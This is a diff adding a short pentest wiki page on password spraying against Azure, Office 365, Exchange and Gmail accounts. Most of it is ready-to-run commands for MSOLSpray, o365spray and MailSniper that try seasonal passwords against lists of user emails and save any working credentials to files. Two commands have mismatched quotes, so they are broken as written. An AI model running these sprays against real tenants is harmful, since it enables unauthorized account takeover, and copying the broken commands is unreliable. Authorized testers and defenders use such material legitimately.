@@ -1,0 +1,32 @@
+# Az - Password Spraying
+
+## Password Spray
+
+In **Azure** this can be done against **different API endpoints** like Azure AD Graph, Microsoft Graph, Office 365 Reporting webservice, etc.
+
+However, note that this technique is **very noisy** and Blue Team can **easily catch it**. Moreover, **forced password complexity** and the use of **MFA** can make this technique kind of useless.
+
+You can perform a password spray attack with [**MSOLSpray**](https://github.com/dafthack/MSOLSpray)
+
+```bash
+git clone https://github.com/dafthack/MSOLSpray
+. .\MSOLSpray\MSOLSpray.ps1
+Invoke-MSOLSpray -UserList .\validemails.txt -Password 'Winter2025! -Verbose
+```
+
+Or with [**o365spray**](https://github.com/0xZDH/o365spray)
+
+```bash
+python3 o365spray.py --spray -U validemails.txt -p ''Winter2025!' --domain victim.com
+```
+
+Or with [**MailSniper**](https://github.com/dafthack/MailSniper)
+
+```bash
+#OWA
+Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt
+#EWS
+Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt
+#Gmail
+Invoke-PasswordSprayGmail -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile gmail-sprayed-creds.txt
+```
